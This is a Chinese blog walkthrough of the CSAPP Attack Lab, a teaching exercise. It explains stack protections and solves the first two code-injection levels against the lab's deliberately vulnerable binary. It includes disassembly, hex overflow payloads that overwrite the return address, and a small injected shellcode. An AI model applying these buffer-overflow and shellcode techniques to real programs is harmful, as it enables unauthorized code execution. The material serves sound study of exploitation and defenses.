<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="这个实验非常有意思，了解一下缓冲区溢出相关的知识就可以开始了。 ​                                                        !  ^_^ !">
<meta property="og:type" content="article">
<meta property="og:title" content="Attack_lab">
<meta property="og:url" content="http://example.com/2023/08/26/Attack-lab/index.html">
<meta property="og:site_name" content="fishjump&#39;s blog">
<meta property="og:description" content="这个实验非常有意思，了解一下缓冲区溢出相关的知识就可以开始了。 ​                                                        !  ^_^ !">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824122941.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824222556.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824231507.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824232603.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824234910.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132143.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132422.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825133258.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825135929.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825141847.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825205403.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210000.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210117.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210817.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210825.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210838.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210846.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825212912.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825213149.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825214129.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825221643.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826014517.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826024848.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826025317.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826034218.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133126.png">
<meta property="og:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133108.png">
<meta property="article:published_time" content="2023-08-26T05:46:26.000Z">
<meta property="article:modified_time" content="2023-08-26T05:56:02.601Z">
<meta property="article:author" content="fishjump">
<meta property="article:tag" content="csapp">
<meta property="article:tag" content="lab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824122941.png">

<link rel="canonical" href="http://example.com/2023/08/26/Attack-lab/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Attack_lab | fishjump's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="fishjump's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">fishjump's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">fly,fly,fly</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/26/Attack-lab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/dog.jpg">
      <meta itemprop="name" content="fishjump">
      <meta itemprop="description" content="一万年太久，只争朝夕">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fishjump's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Attack_lab
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-08-26 13:46:26 / 修改时间：13:56:02" itemprop="dateCreated datePublished" datetime="2023-08-26T13:46:26+08:00">2023-08-26</time>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>16 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>这个实验非常有意思，了解一下缓冲区溢出相关的知识就可以开始了。</p>
<p>​                                                        !  ^_^ !</p>
<span id="more"></span>

<p><strong>文件信息：</strong></p>
<p>argetk中的文件包括:<br>README.txt：描述目录内容的文件<br>ctarget：易受代码注入攻击的可执行程序<br>rtarget：易受面向返回编程攻击的可执行程序<br>cookie.txt：8位十六进制代码，您将在攻击中使用它作为唯一标识符。<br>farm.c：目标“gadget farm”的源代码，您将使用它生成面向返回的编程攻击。<br>hex2raw：生成攻击字符串的实用程序。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43362650/article/details/121084611">《深入理解计算机系统》实验三Attack Lab下载和官方文档机翻_Addyz的博客-CSDN博客</a></p>
<p>看官方文档说是要以csapp3.10.3–3.10.4作为参考，这两个小节主要讲了<strong>缓冲区溢出</strong>和保护机制。</p>
<h3 id="缓冲区溢出："><a href="#缓冲区溢出：" class="headerlink" title="缓冲区溢出："></a>缓冲区溢出：</h3><h3 id="对抗缓冲区溢出攻击："><a href="#对抗缓冲区溢出攻击：" class="headerlink" title="对抗缓冲区溢出攻击："></a>对抗缓冲区溢出攻击：</h3><h4 id="栈随机化："><a href="#栈随机化：" class="headerlink" title="栈随机化："></a>栈随机化：</h4><p>栈的位置每次运行都有变化，因此很多地址不能确定，代码不能实现跳转。实现的方法是在程序开始时，在栈上分配一段0~n字节之间随机大小的空间。</p>
<h4 id="金丝雀值-canary"><a href="#金丝雀值-canary" class="headerlink" title="金丝雀值(canary):"></a>金丝雀值(canary):</h4><p>在栈的缓冲区开始的位置填充一个值，每次函数调用这个数值要和数据段中的一个不可更改的值进行比较，一旦发生缓冲区溢出，cannary值就会发生变化，从而结束程序。</p>
<h4 id="限制可执行代码区域："><a href="#限制可执行代码区域：" class="headerlink" title="限制可执行代码区域："></a>限制可执行代码区域：</h4><p>栈空间被设置为不可执行属性，所以不能直接在输入的字符中创建shellcode，要通过rop才能实行攻击。</p>
<h3 id="实验部分1代码注入攻击："><a href="#实验部分1代码注入攻击：" class="headerlink" title="实验部分1代码注入攻击："></a>实验部分1代码注入攻击：</h3><h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1:"></a>Level1:</h4><p>test 调用完getbuf，使getbuf 返回执行touch1 而不是返回test 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!:You called touch1()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的汇编内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	call   400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们只要确定存放返回地址的位置，将其覆盖成4017c0即可。可以看到调用getbuf之后，sub    $0x28,%rsp，创建了0x28字节的缓冲区域，返回地址位于栈底，第一个字符距离栈底28个字节，我们只要输入一串长度为32字节的字符，前二十八个任意填充，后四个按照小端序填充touch1的地址c0 17 40 00即可。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">c0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824122941.png"></p>
<p>正确的姿势是将16进制数据写入flag1.txt然后使用题目中给出的16进制转字符串工具&gt;flag01.txt,然后将flag01.txt作为参数传入。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; flag1.txt  &gt; input1.txt</span><br></pre></td></tr></table></figure>

<p>注意这里的&lt; 和 &gt;不是括号，而是指向，将flag1.txt传入hex，其输出结果写入input1.txt</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ctarget -q -i flag01.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>-q选项是不连接网络 （不加此选项会报错）</li>
<li>-i 是 以文件作为输入</li>
</ul>
<h4 id="Level2："><a href="#Level2：" class="headerlink" title="Level2："></a>Level2：</h4><p>test调用getbuf，并返回touch2，和level1的不同在于touch2需要参数，函数的第一个参数是存放在rdi寄存器中的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val==cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touche2(0x%.8x)&quot;</span>,val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>,val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的汇编内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt; vlevel=2;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;   if(val==cookie)</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先还是在保存返回地址的地方填充touch2的地址，接下来的难点在于如何将cookie填充到rdi中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp    0x202ce2(%rip),%edi    # if(val==cookie)</span><br></pre></td></tr></table></figure>

<p>cookie的值储存在相对rip偏移0x202ce2的位置。<strong>思路：</strong> 仍然填充44个字节，最后四个字节填充我们编写的shellcode的地址，通过执行shellcode，rdi填充了cookie，并将touch2的地址pop进了栈，最后ret回到touch2。ret指令相当于pop ip，我们64位机器使用retq。</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824222556.png"></p>
<p>使用gdb进行调试，<code>b getbuf</code> 将断点设在getbuf函数，查看栈的地址，减去0x28之后，栈顶的地址是0x5561dc78。这是我们填充的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov 0x59b997fa,%edi</span><br><span class="line">push touch2_address</span><br><span class="line">retq</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">return_address</span><br></pre></td></tr></table></figure>

<p>有一点要注意，栈是从高地址向低地址增长，而代码是从低地址往高地址执行所以填充之后栈空间应该是这样<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824231507.png">接下来是得到相应的字节码，首先用gcc进行汇编操作得到.o后缀的目标文件，然后用odjdump进行反汇编即可。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824232603.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi</span><br><span class="line">5:	68 ec 17 40 00       	push   $0x4017ec</span><br><span class="line">c:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>

